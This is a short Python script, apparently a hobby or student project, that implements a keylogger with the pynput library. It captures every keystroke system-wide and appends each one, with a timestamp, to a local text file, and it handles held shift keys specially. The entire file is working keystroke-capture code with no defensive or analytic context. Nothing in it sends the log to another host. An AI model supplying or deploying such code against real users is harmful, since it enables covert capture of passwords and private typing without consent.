import os
import time
from pynput.keyboard import Listener, Key

# file where the keystrokes are logged
path = "loggedKeys.txt"
# dictionary to track whether the left or right shift key is currently being pressed
pressed = {Key.shift_l: False, Key.shift_r: False}


# function that writes keystrokes to log file
def write_file(key):
    # open the log file and append in
    with open(path, "a") as file:
        # stores the current timestamp
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        # convert the key to a string with no surrounding quotes
        key_str = str(key).replace("'", "")

        # writes specific keys to file and their times
        if key == Key.backspace:
            file.write(f"[{timestamp}] Key.backspace\n")
        elif key == Key.enter:
            file.write(f"[{timestamp}] Key.enter\n")
        elif key == Key.space:
            file.write(f"[{timestamp}] Key.space\n")
        elif key == Key.caps_lock:
            file.write(f"[{timestamp}] Key.caps_Lock\n")
        elif key == Key.shift_l:
            file.write(f"[{timestamp}] Key.shift_l\n")
        elif key == Key.shift_r:
            file.write(f"[{timestamp}] Key.shift_r\n")
        # handles logging special keys
        elif isinstance(key, Key):
            file.write(f"[{timestamp}] {key_str.replace('Key.','')}\n")
        # handles logging the regular characters
        else:
            file.write(f"[{timestamp}] '{key_str}'\n")


# function that handles release of key
def on_release(key):
    global pressed

    # if left or right shift is released, then marked as not pressed
    if key in pressed:
        pressed[key] = False


# function that handles press of key
def on_press(key):
    global pressed
    # if left or right shift is pressed, then check if it has already been logged
    if key in pressed:
        # if not already pressed
        if not pressed[key]:
            write_file(key)
        pressed[key] = True  # shift is currently pressed
    else:
        # handles other key presses
        write_file(key)

# starts the listening of keyboard input
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
